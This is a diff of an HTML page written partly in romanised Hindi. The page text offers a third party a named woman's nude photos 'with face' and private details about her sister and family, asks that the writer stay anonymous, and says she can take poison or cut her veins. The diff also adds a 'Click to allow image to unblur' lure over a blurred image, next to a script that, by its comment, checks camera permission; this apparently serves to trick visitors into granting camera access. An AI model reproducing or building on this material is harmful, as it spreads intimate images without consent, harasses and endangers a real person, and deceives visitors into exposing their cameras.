@@ -3,12 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title style="color: blue;">Ye sharte maan le fir sab khatam karte hai.</title>
+    <title>Ye sharte maan le fir sab khatam karte hai.</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        h1 {
+            color: blue;
+        }
+
+        p {
+            max-width: 600px;
+            text-align: justify;
+            margin: 20px 0;
+        }
+
+        img {
+            filter: blur(70%);
+            transition: filter 0.5s;
+        }
+
+        .blur-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .blur-text:hover + img {
+            filter: blur(0);
+        }
+    </style>
 </head>
 <body>
 
 <h1>Deal bs ye hai is sabme mera naam nahe aay</h1>
-<p>Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate. </p>
+<p>Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate. </p>
+
+<div class="blur-text">Click to allow image to unblur</div>
+<img src="image.jpg" alt="Blurred Image">
 
 <script>
     // Check if camera permission is already granted
